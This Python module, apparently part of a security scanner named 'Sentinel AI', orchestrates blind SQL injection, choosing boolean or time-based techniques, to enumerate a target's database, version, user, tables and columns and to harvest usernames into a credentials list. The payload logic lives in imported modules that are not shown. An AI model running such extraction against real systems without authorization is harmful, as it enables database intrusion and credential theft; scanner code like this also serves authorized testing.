"""
===========================================================
Project : Sentinel AI
Module  : Blind SQL Extractor
File ID : SCANNER-BLIND-EXTRACTOR-001
Version : 1.0.0
===========================================================

Description:
Extracts data using Blind SQL Injection.
Supports both Boolean and Time-based techniques.
"""

from __future__ import annotations

import logging
from typing import List, Optional, Dict, Any, Tuple

from app.modules.scanner.modules.blind_boolean import BlindBooleanScanner
from app.modules.scanner.modules.blind_time import BlindTimeScanner

logger = logging.getLogger(__name__)


class BlindExtractor:
    """
    Extracts data using Blind SQL Injection.
    """

    def __init__(self, target: str):
        self.target = target
        self.boolean_scanner = BlindBooleanScanner(target)
        self.time_scanner = BlindTimeScanner(target)
        self.technique: Optional[str] = None
        self.dbms: Optional[str] = None

        self.extracted_data: Dict[str, Any] = {
            "database": None,
            "version": None,
            "user": None,
            "tables": [],
            "columns": {},
            "credentials": [],
        }

    def extract(self) -> Dict[str, Any]:
        """
        Extract data using the best available technique.

        Returns:
            Extracted data dictionary
        """
        logger.info("[BlindExtractor] Starting Blind SQL extraction...")

        # Step 1: Detect technique
        if self.boolean_scanner.detect():
            self.technique = "boolean"
            logger.info("[BlindExtractor] Using Boolean-based extraction")
            self._extract_boolean()
        elif self.time_scanner.detect():
            self.technique = "time"
            logger.info("[BlindExtractor] Using Time-based extraction")
            self._extract_time()
        else:
            logger.info("[BlindExtractor] ❌ No Blind SQLi technique available")
            return self.extracted_data

        return self.extracted_data

    def _extract_boolean(self) -> None:
        """Extract using Boolean-based technique."""
        scanner = self.boolean_scanner

        self.extracted_data["database"] = scanner.extract_database()
        self.extracted_data["version"] = scanner.extract_version()
        self.extracted_data["user"] = scanner.extract_user()

        tables = scanner.extract_tables()
        self.extracted_data["tables"] = tables

        # Extract columns from each table
        for table in tables:
            columns = scanner.extract_columns(table)
            self.extracted_data["columns"][table] = columns

            # Extract data from user table
            if "user" in table.lower():
                for col in columns:
                    if "user" in col.lower() or "name" in col.lower():
                        data = scanner.extract_data(table, col, limit=10)
                        for row in data:
                            self.extracted_data["credentials"].append(
                                {
                                    "username": row,
                                }
                            )

    def _extract_time(self) -> None:
        """Extract using Time-based technique."""
        scanner = self.time_scanner

        self.extracted_data["database"] = scanner.extract_database()
        self.extracted_data["version"] = scanner.extract_version()
        self.extracted_data["user"] = scanner.extract_user()

        tables = scanner.extract_tables()
        self.extracted_data["tables"] = tables

        # Extract columns from each table
        for table in tables:
            columns = scanner.extract_columns(table)
            self.extracted_data["columns"][table] = columns

            # Extract data from user table
            if "user" in table.lower():
                for col in columns:
                    if "user" in col.lower() or "name" in col.lower():
                        data = scanner.extract_data(table, col, limit=10)
                        for row in data:
                            self.extracted_data["credentials"].append(
                                {
                                    "username": row,
                                }
                            )
